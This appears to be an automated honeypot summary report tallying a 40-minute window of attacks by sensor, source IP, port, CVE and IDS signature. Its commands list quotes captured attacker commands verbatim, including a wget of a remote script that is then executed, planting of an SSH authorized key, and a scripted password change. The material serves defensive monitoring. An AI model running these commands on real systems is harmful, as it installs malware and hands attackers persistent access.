**Honeypot Attack Summary Report**

*   **Report Generation Time:** 2025-10-25T01:01:25Z
*   **Timeframe Covered:** 2025-10-25T00:20:01Z to 2025-10-25T01:00:01Z
*   **Log Files:**
    *   `agg_log_20251025T002001Z.json`
    *   `agg_log_20251025T004002Z.json`
    *   `agg_log_20251025T010001Z.json`

**Executive Summary**

This report summarizes 14,198 events collected from the honeypot network over a 40-minute period. The primary attack vectors observed were SSH brute-force attempts, SMB vulnerability scanning, and various web exploitation attempts. A significant portion of the traffic originated from a small number of highly active IP addresses. The most frequently observed honeypots were Cowrie, Honeytrap, and Suricata, indicating a high volume of SSH, general TCP, and network-level attacks.

**Detailed Analysis**

*   **Attacks by Honeypot:**
    *   Cowrie: 4066
    *   Honeytrap: 3868
    *   Suricata: 3676
    *   Ciscoasa: 1917
    *   Sentrypeer: 256
    *   Mailoney: 145
    *   Dionaea: 102
    *   Tanner: 65
    *   Redishoneypot: 47
    *   Adbhoney: 18
    *   H0neytr4p: 17
    *   ConPot: 11
    *   Honeyaml: 5
    *   ssh-rsa: 2
    *   Wordpot: 2
    *   Ipphoney: 1

*   **Top Attacking IPs:**
    *   148.230.249.142: 1326
    *   80.94.95.238: 1547
    *   45.78.192.211: 868
    *   164.92.152.52: 426
    *   188.166.126.51: 458
    *   167.71.204.253: 204
    *   197.5.145.8: 198
    *   107.170.36.5: 239
    *   196.251.71.24: 226
    *   95.85.114.218: 175

*   **Top Targeted Ports/Protocols:**
    *   TCP/445: 1369
    *   22: 699
    *   5060: 256
    *   23: 118
    *   25: 145
    *   80: 83
    *   5903: 122
    *   5901: 107
    *   6379: 37
    *   8333: 118

*   **Most Common CVEs:**
    *   CVE-2002-0013, CVE-2002-0012
    *   CVE-2021-41773
    *   CVE-2021-42013
    *   CVE-2024-4577, CVE-2002-0953
    *   CVE-2024-1709
    *   CVE-2005-4050

*   **Commands Attempted by Attackers:**
    *   `cat /proc/uptime 2 > /dev/null | cut -d. -f1`
    *   `cd ~; chattr -ia .ssh; lockr -ia .ssh`
    *   `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys`
    *   `cat /proc/cpuinfo | grep name | wc -l`
    *   `uname -a`
    *   `rm -rf /data/local/tmp; mkdir -p /data/local/tmp; cd /data/local/tmp/; busybox wget http://213.209.143.62/w.sh; sh w.sh`
    *   `echo -e "ftpuser01123\nPyraItGudQPt\nPyraItGudQPt"|passwd|bash`

*   **Signatures Triggered:**
    *   ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
    *   ET SCAN MS Terminal Server Traffic on Non-standard Port
    *   ET DROP Dshield Block Listed Source group 1
    *   ET SCAN NMAP -sS window 1024
    *   ET HUNTING RDP Authentication Bypass Attempt
    *   ET INFO Reserved Internal IP Traffic
    *   ET CINS Active Threat Intelligence Poor Reputation IP

*   **Users / Login Attempts:**
    *   root/el
    *   root/Elabbb_Dmin0003
    *   gera/gera123
    *   zte/zte123
    *   tianyi/tianyi
    *   ubuntu/ubuntu
    *   postgres/1234567890

*   **Files Uploaded/Downloaded:**
    *   sh
    *   wget.sh;
    *   ip
    *   w.sh;
    *   c.sh;

*   **HTTP User-Agents:**
    *   *None observed*

*   **SSH Clients and Servers:**
    *   *None observed*

*   **Top Attacker AS Organizations:**
    *   *None observed*

**Key Observations and Anomalies**

*   A high number of attacks are attributed to a small set of IP addresses, suggesting targeted or botnet activity.
*   The presence of the DoublePulsar backdoor signature indicates attempts to exploit SMB vulnerabilities, likely related to historical exploits like EternalBlue.
*   Attackers frequently attempt to download and execute shell scripts from external URLs, a common tactic for malware installation.
*   There's a consistent pattern of reconnaissance commands (`uname`, `lscpu`, `cat /proc/cpuinfo`) followed by attempts to modify SSH authorized_keys.
*   The variety of CVEs targeted, from older vulnerabilities (CVE-2002-0013) to more recent ones (CVE-2024-1709), highlights the broad-spectrum scanning approach of many attackers.